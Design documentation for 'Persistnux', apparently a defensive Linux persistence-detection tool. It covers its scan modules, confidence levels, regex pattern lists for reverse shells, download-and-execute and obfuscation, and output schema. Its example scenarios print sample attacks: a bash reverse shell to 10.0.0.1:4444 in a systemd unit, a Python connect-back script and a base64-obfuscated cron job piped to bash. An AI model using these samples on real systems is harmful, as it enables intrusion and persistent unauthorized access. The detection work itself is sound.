# Persistnux Detection Logic Tree

## Version 1.8.0

This document describes the complete detection and analysis logic flow.

---

## Use Cases

### 1. Incident Response - Post-Compromise Analysis
```bash
# Full scan with all findings for forensic analysis
sudo ./persistnux.sh --all

# Output: Complete inventory of all persistence mechanisms
# Use: Compare against known-good baseline, identify anomalies
```

### 2. Threat Hunting - Proactive Search
```bash
# Focus on HIGH/CRITICAL findings only
sudo MIN_CONFIDENCE=HIGH ./persistnux.sh

# Output: Only suspicious findings requiring immediate investigation
# Use: Quick triage during active threat hunt
```

### 3. Security Audit - Compliance Check
```bash
# Standard suspicious-only scan
sudo ./persistnux.sh

# Output: MEDIUM, HIGH, CRITICAL findings
# Use: Regular security audits, identify misconfigurations
```

### 4. Baseline Creation
```bash
# Capture all persistence points on clean system
sudo FILTER_MODE=all ./persistnux.sh
mv persistnux_output/ baseline_$(date +%Y%m%d)/

# Later: Compare against baseline
diff baseline_*/persistnux_*.csv current_scan/persistnux_*.csv
```

---

## Detection Module Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                    PERSISTNUX EXECUTION FLOW                     │
├─────────────────────────────────────────────────────────────────┤
│  1. Initialize → Parse args, create output files                │
│  2. Build Patterns → Compile regex for fast matching            │
│  3. Run 8 Detection Modules (sequential)                        │
│  4. Output → CSV + JSONL with matched patterns                  │
│  5. Cleanup → Remove temp files                                 │
└─────────────────────────────────────────────────────────────────┘

Detection Modules:
  [1/8] Systemd Services    → .service files, ExecStart analysis
  [2/8] Cron Jobs           → System/user crontabs, at jobs
  [3/8] Shell Profiles      → .bashrc, .profile, /etc/profile.d
  [4/8] SSH Persistence     → authorized_keys, ssh_config
  [5/8] Init Scripts        → rc.local, /etc/init.d
  [6/8] Kernel/Preload      → ld.so.preload, kernel modules
  [7/8] Additional          → XDG autostart, sudoers, PAM, MOTD
  [8/8] Backdoor Locations  → Package managers, git, webshells
```

---

## Confidence Level Definitions

| Level | Meaning | Action Required |
|-------|---------|-----------------|
| **LOW** | Baseline system config, package-managed | Informational only |
| **MEDIUM** | Potentially suspicious, needs review | Manual review recommended |
| **HIGH** | Suspicious patterns detected | Investigate immediately |
| **CRITICAL** | Modified package files, likely compromise | Incident response required |

---

## Module 1: Systemd Services Detection Tree (OPTIMIZED)

```
┌─────────────────────────────────────────────────────────────────┐
│              SYSTEMD SERVICE ANALYSIS (v1.8.0)                  │
│         Only scans .service files (not .socket/.timer)          │
│                                                                 │
│  OPTIMIZATION: Package verification FIRST, skip analysis if OK │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ SCAN PATHS:                                                     │
│   /etc/systemd/system     /usr/lib/systemd/system               │
│   /lib/systemd/system     /run/systemd/system                   │
│   /etc/systemd/user       ~/.config/systemd/user                │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │   For each .service file:     │
              │   Extract: ExecStart=<cmd>    │
              │   Get: enabled status, age    │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │   Is ExecStart present?       │
              └───────────────────────────────┘
                     │              │
                    YES            NO
                     │              │
                     │              ▼
                     │    ┌────────────────────────┐
                     │    │ Check service file     │
                     │    │ package status:        │
                     │    │ • Verified → LOW       │
                     │    │ • Modified → CRITICAL  │
                     │    │ • Unmanaged → MEDIUM   │
                     │    └────────────────────────┘
                     │
                     ▼
         ┌──────────────────────────────────┐
         │     Extract executable from       │
         │     ExecStart command             │
         └──────────────────────────────────┘
                     │
                     ▼
    ┌────────────────────────────────────────┐
    │   Is executable an INTERPRETER?        │
    │   (python, perl, ruby, bash, sh, etc.) │
    └────────────────────────────────────────┘
           │                        │
          YES                       NO
           │                        │
           ▼                        ▼
┌─────────────────────┐   ┌─────────────────────────────┐
│  INTERPRETER PATH   │   │  DIRECT BINARY PATH         │
│  (must analyze the  │   │  (can skip if verified)     │
│  script, not the    │   │                             │
│  interpreter)       │   │                             │
└─────────────────────┘   └─────────────────────────────┘
           │                        │
           ▼                        ▼


═══════════════════════════════════════════════════════════════════
                    INTERPRETER PATH
═══════════════════════════════════════════════════════════════════

    ┌────────────────────────────────────────┐
    │ 1. Check interpreter binary itself     │
    │                                        │
    │ Is /usr/bin/python3 compromised?       │
    │   • Modified package → CRITICAL        │
    │   • Unmanaged from odd path → HIGH     │
    └────────────────────────────────────────┘
                     │
                     ▼
    ┌────────────────────────────────────────┐
    │ 2. Extract script path from args       │
    │                                        │
    │ ExecStart=/usr/bin/python3 /opt/app.py │
    │                              ▲          │
    │                              │          │
    │               THIS is what we analyze  │
    └────────────────────────────────────────┘
                     │
         ┌───────────┴───────────┐
         │                       │
    Script found            No script (inline -c)
         │                       │
         ▼                       ▼
    ┌────────────────┐    ┌─────────────────┐
    │ Check SCRIPT's │    │ Inline code     │
    │ package status │    │ python -c "..." │
    │ FIRST!         │    │ → HIGH          │
    └────────────────┘    └─────────────────┘
         │
    ┌────┴────┬──────────────┐
    │         │              │
 Verified  Modified     Unmanaged
    │         │              │
    ▼         ▼              ▼
┌──────┐  ┌────────┐  ┌──────────────────┐
│ LOW  │  │CRITICAL│  │ Analyze content: │
│ DONE │  │ DONE   │  │ • socket ops     │
│ SKIP │  │        │  │ • base64 decode  │
│ REST │  │        │  │ • high entropy   │
└──────┘  └────────┘  │ • location check │
                      │                  │
                      │ Suspicious →HIGH │
                      └──────────────────┘


═══════════════════════════════════════════════════════════════════
                    DIRECT BINARY PATH
═══════════════════════════════════════════════════════════════════

    ┌────────────────────────────────────────┐
    │ 1. Check package status FIRST          │
    │    (This is the key optimization!)     │
    │                                        │
    │    dpkg -S /usr/sbin/sshd              │
    │    dpkg --verify openssh-server        │
    └────────────────────────────────────────┘
                     │
    ┌────────────────┼────────────────┐
    │                │                │
 Verified        Modified        Unmanaged
    │                │                │
    ▼                ▼                ▼
┌──────────┐   ┌──────────┐   ┌───────────────────┐
│   LOW    │   │ CRITICAL │   │ Continue with     │
│   DONE   │   │   DONE   │   │ full analysis...  │
│          │   │          │   │                   │
│ ★ SKIP   │   │          │   │                   │
│ ALL      │   │          │   │                   │
│ PATTERN  │   │          │   │                   │
│ ANALYSIS │   │          │   │                   │
└──────────┘   └──────────┘   └───────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 2. Location check               │
                   │    /tmp, /dev/shm → HIGH        │
                   └──────────────────────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 3. If script, analyze content   │
                   │    Suspicious patterns → HIGH   │
                   └──────────────────────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 4. Pattern match on ExecStart   │
                   │    curl|bash, /dev/tcp → HIGH   │
                   └──────────────────────────────────┘
                                      │
                                      ▼
                   ┌──────────────────────────────────┐
                   │ 5. Time-based check             │
                   │    Recent + enabled → HIGH      │
                   └──────────────────────────────────┘


═══════════════════════════════════════════════════════════════════
                    PERFORMANCE IMPACT
═══════════════════════════════════════════════════════════════════

BEFORE (old flow):
  For EVERY service file:
    1. grep dangerous patterns     ← subprocess
    2. grep suspicious patterns    ← 4+ subprocess calls
    3. check is_command_safe       ← package check here (late!)
    4. more analysis...

AFTER (optimized):
  For EVERY service file:
    1. Extract executable
    2. Check package status        ← EARLY EXIT if verified
       └─ Verified? → LOW, DONE    ← Skip all grep calls!

  Typical system: ~200 services, ~180 are package-managed
  BEFORE: 200 × (5+ grep calls) = 1000+ subprocesses
  AFTER:  200 × (1 dpkg call) + 20 × (5 grep calls) = 300 calls

  ≈ 70% reduction in subprocess spawning!
```

---

## Pattern Matching Logic

### Pattern Categories and Examples

```
┌─────────────────────────────────────────────────────────────────┐
│                    PATTERN MATCHING FLOW                        │
└─────────────────────────────────────────────────────────────────┘

Input: ExecStart="/usr/bin/python3 -c 'import socket;s=socket.socket()'"

                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ COMBINED PATTERN CHECK (Fast Path)                              │
│                                                                 │
│ Build combined regex from all patterns in category:             │
│   (pattern1|pattern2|pattern3|...)                              │
│                                                                 │
│ Single grep -qE check - if no match, skip category              │
└─────────────────────────────────────────────────────────────────┘
                              │
                         Match Found
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ SPECIFIC PATTERN IDENTIFICATION                                 │
│                                                                 │
│ Loop through individual patterns to find exact match:           │
│   Pattern: "python.*socket\.socket"                             │
│   Match:   "python3 -c 'import socket;s=socket.socket"          │
│                                                                 │
│ Set globals:                                                    │
│   MATCHED_PATTERN = "python.*socket\.socket"                    │
│   MATCHED_CATEGORY = "command"                                  │
│   MATCHED_STRING = "python3 -c 'import socket;s=socket.socket"  │
└─────────────────────────────────────────────────────────────────┘
```

### NEVER_WHITELIST Patterns (Always HIGH/CRITICAL)

These patterns ALWAYS trigger regardless of package management status:

```
Category: Reverse Shell Indicators
├── /dev/tcp/              # Bash network pseudo-device
├── /dev/udp/              # Bash network pseudo-device
├── bash -i                # Interactive shell
├── sh -i                  # Interactive shell
├── nc -e                  # Netcat execute
├── nc .*-e                # Netcat execute (alternate)
├── ncat -e                # Ncat execute
├── \| *nc                 # Piping to netcat
├── \| *bash               # Piping to bash
├── \| *sh                 # Piping to sh
├── \| */bin/sh            # Piping to /bin/sh
├── \| */bin/bash          # Piping to /bin/bash
├── >&[ ]*/dev/            # Redirect to /dev (shell trick)

Category: Socket Operations
├── exec [0-9].*socket     # Bash fd + socket
├── python.*socket\.socket # Python socket creation
├── python.*import socket.*connect
├── perl.*socket.*connect
├── ruby.*TCPSocket
├── ruby.*Socket\.new

Category: Network Tools
├── socat.*exec:           # Socat with exec
├── socat.*TCP:            # Socat TCP
├── telnet.*\|.*bash
├── telnet.*\|.*sh
├── xterm -display         # X11 forwarding abuse

Category: Named Pipes
├── mknod.*backpipe
└── mkfifo.*/tmp
```

### SUSPICIOUS_COMMANDS Patterns

```
Category: Download & Execute
├── curl.*\|.*bash         # curl | bash
├── curl.*\|.*sh           # curl | sh
├── wget.*\|.*bash         # wget | bash
├── wget.*\|.*sh           # wget | sh
├── curl.* sh -c           # curl output to sh -c
├── wget.* sh -c           # wget output to sh -c
├── curl.*-o.*/tmp         # Download to /tmp
└── wget.*-O.*/tmp         # Download to /tmp

Category: Obfuscation/Encoding
├── base64 -d              # Base64 decode
├── base64 --decode        # Base64 decode (long)
├── eval.*\$.*base64       # Eval base64 decoded
├── echo.*\|.*base64.*-d   # Echo to base64 decode
└── openssl.*-d.*-base64   # OpenSSL base64 decode

Category: Inline Code Execution
├── python.*-c.*import     # Python one-liner
├── perl -e                # Perl one-liner
├── ruby -e                # Ruby one-liner
├── php -r                 # PHP one-liner
└── php.*fsockopen         # PHP socket

Category: Permission Manipulation
├── chmod \+x.*/tmp        # Executable in /tmp
├── chmod \+x.*/dev/shm    # Executable in /dev/shm
└── chmod 777              # World-writable
```

### SUSPICIOUS_LOCATIONS Patterns

```
^/dev/shm/                 # Shared memory (volatile)
^/tmp/                     # Temp directory
^/var/tmp/                 # Persistent temp
/\.[a-z]                   # Hidden files/dirs
\.\./\.\.                  # Path traversal
```

---

## Module 2: Cron Detection Logic

```
┌─────────────────────────────────────────────────────────────────┐
│                     CRON ANALYSIS FLOW                          │
└─────────────────────────────────────────────────────────────────┘

SCAN LOCATIONS:
├── /etc/crontab           # System crontab
├── /etc/cron.d/*          # System cron jobs
├── /etc/cron.daily/*      # Daily scripts
├── /etc/cron.hourly/*     # Hourly scripts
├── /etc/cron.weekly/*     # Weekly scripts
├── /etc/cron.monthly/*    # Monthly scripts
├── /var/spool/cron/*      # User crontabs
└── at jobs (atq)          # Scheduled one-time jobs

For each cron file/entry:
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Check for suspicious content: │
              │ • curl, wget, nc, netcat      │
              │ • /tmp, /dev/shm references   │
              │ • /dev/tcp, /dev/udp          │
              │ • base64 decode               │
              │ • chmod +x                    │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Check modification age:       │
              │ < 7 days? → HIGH confidence   │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ If cron is a script:          │
              │ → Run full script analysis    │
              │ → Check for interpreters      │
              └───────────────────────────────┘
                              │
                              ▼
              ┌───────────────────────────────┐
              │ Adjust for package management │
              │ Package-managed → Lower conf  │
              └───────────────────────────────┘
```

---

## Module 3-8: Other Detection Modules

### Shell Profiles (Module 3)
```
SCAN: /etc/profile, /etc/bash.bashrc, ~/.bashrc, ~/.profile, etc.
CHECK: curl, wget, nc, eval, base64 decode, chmod +x
CONFIDENCE: Suspicious content → HIGH, else LOW
```

### SSH Persistence (Module 4)
```
SCAN: ~/.ssh/authorized_keys, ~/.ssh/config, /etc/ssh/sshd_config
CHECK: Key counts, ProxyCommand, port forwarding, weak configs
CONFIDENCE: Suspicious config → MEDIUM/HIGH
```

### Init Scripts (Module 5)
```
SCAN: /etc/rc.local, /etc/init.d/*, /etc/rc*.d/*
CHECK: Suspicious commands in startup scripts
CONFIDENCE: curl/wget/nc in init → HIGH
```

### Kernel/Preload (Module 6)
```
SCAN: /etc/ld.so.preload, /etc/ld.so.conf.d/*, lsmod
CHECK: LD_PRELOAD entries, loaded kernel modules
CONFIDENCE: Non-empty ld.so.preload → HIGH
```

### Additional Persistence (Module 7)
```
SCAN: XDG autostart, /etc/environment, sudoers, PAM, MOTD
CHECK: Suspicious exec lines, LD_PRELOAD in env, unusual PAM modules
CONFIDENCE: Context-dependent
```

### Backdoor Locations (Module 8)
```
SCAN: APT/YUM configs, git configs, web directories
CHECK: Webshell patterns (eval, base64_decode, system())
CONFIDENCE: Recently modified + webshell patterns → HIGH
```

---

## Output Schema

### CSV Columns (v1.8.0)
```
timestamp,hostname,category,confidence,file_path,file_hash,
file_owner,file_permissions,file_age_days,package_status,
command,enabled_status,description,matched_pattern,matched_string
```

### JSONL Fields
```json
{
  "timestamp": "2026-02-02T10:30:00Z",
  "hostname": "server01",
  "category": "Systemd Service",
  "confidence": "HIGH",
  "file_path": "/etc/systemd/system/backdoor.service",
  "file_hash": "abc123...",
  "file_owner": "root:root",
  "file_permissions": "644",
  "file_age_days": "3",
  "package_status": "unmanaged",
  "command": "/usr/bin/python3 -c 'import socket...'",
  "enabled_status": "enabled",
  "description": "backdoor.service",
  "matched_pattern": "python.*socket\\.socket",
  "matched_string": "python3 -c 'import socket"
}
```

---

## Example Detection Scenarios

### Scenario 1: Reverse Shell Service
```
Input:  /etc/systemd/system/update.service
        ExecStart=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

Detection Path:
  1. Extract ExecStart
  2. STEP 1: Check dangerous patterns
     → Match: "/dev/tcp/" in command
  3. Result: HIGH confidence
     matched_pattern: "dangerous_command"
     matched_string: "/dev/tcp/"
```

### Scenario 2: Python Backdoor Script
```
Input:  /etc/systemd/system/monitor.service
        ExecStart=/usr/bin/python3 /opt/monitor.py

        /opt/monitor.py contains:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.0.0.1", 4444))

Detection Path:
  1. Extract ExecStart
  2. STEP 1-4: No direct pattern match
  3. STEP 5: Detect interpreter (python3)
  4. STEP 5b: Analyze /opt/monitor.py
     → Script content analysis finds socket operations
  5. Result: HIGH confidence
     matched_pattern: "socket.*connect"
     matched_string: "s.connect(("
```

### Scenario 3: Legitimate Package-Managed Service
```
Input:  /lib/systemd/system/ssh.service
        ExecStart=/usr/sbin/sshd -D

Detection Path:
  1. Extract ExecStart
  2. STEP 1-2: No pattern matches
  3. STEP 3: is_command_safe()
     → /usr/sbin/sshd is in known-good path
     → dpkg -S /usr/sbin/sshd → openssh-server
     → dpkg --verify openssh-server → clean
  4. Result: LOW confidence
     (filtered out in default suspicious_only mode)
```

### Scenario 4: Modified System Binary (Rootkit)
```
Input:  /lib/systemd/system/cron.service
        ExecStart=/usr/sbin/cron -f

        /usr/sbin/cron has been modified (rootkit)

Detection Path:
  1. Extract ExecStart
  2. STEP 3: is_command_safe()
     → /usr/sbin/cron is in known-good path
     → dpkg -S /usr/sbin/cron → cron
     → dpkg --verify cron → MODIFIED!
  3. Result: CRITICAL confidence
     package_status: "dpkg:cron:MODIFIED"
```

### Scenario 5: Base64 Obfuscated Cron Job
```
Input:  /etc/cron.d/backup
        * * * * * root echo 'YmFzaCAtaQ==' | base64 -d | bash

Detection Path:
  1. Read cron content
  2. Pattern check:
     → Match: "echo.*|.*base64.*-d" (obfuscation)
     → Match: "| bash" (piping to shell)
  3. Result: HIGH confidence
     matched_pattern: "\| *bash"
     matched_string: "| bash"
```

---

## Performance Optimizations

### Package Manager Cache
```
First lookup:  dpkg -S /usr/bin/python3 → python3
               Cache: PKG_CACHE["/usr/bin/python3"]="dpkg:python3"

Subsequent:    Cache hit → Skip dpkg call
               Return cached result immediately
```

### Combined Pattern Matching
```
Instead of:
  for pattern in patterns; do
    grep -qE "$pattern"   # N subprocess calls
  done

Now:
  combined="(pattern1|pattern2|...)"
  grep -qE "$combined"    # 1 subprocess call
  if match:
    # Only then loop to find specific pattern
```

---

## Filter Modes

```
┌─────────────────────────────────────────────────────────────────┐
│                      FILTER MODE LOGIC                          │
└─────────────────────────────────────────────────────────────────┘

Default: FILTER_MODE=suspicious_only
  → Show: MEDIUM, HIGH, CRITICAL
  → Hide: LOW

--all flag: FILTER_MODE=all
  → Show: LOW, MEDIUM, HIGH, CRITICAL

MIN_CONFIDENCE=HIGH:
  → Show: HIGH, CRITICAL only
  → Hide: LOW, MEDIUM

Combination: MIN_CONFIDENCE=HIGH --all
  → Show: HIGH, CRITICAL
  → (--all has no effect when MIN_CONFIDENCE is set)
```

---

## Quick Reference: What Triggers Each Confidence Level

| Confidence | Triggers |
|------------|----------|
| **CRITICAL** | Modified package files (dpkg/rpm verify failed) |
| **HIGH** | Reverse shell patterns, download+execute, obfuscation, suspicious script content, inline code (-c flag), recent+enabled+unknown, suspicious locations |
| **MEDIUM** | Unmanaged files, unusual configurations, potential concerns requiring review |
| **LOW** | Package-managed files, known-good paths, baseline system configuration |
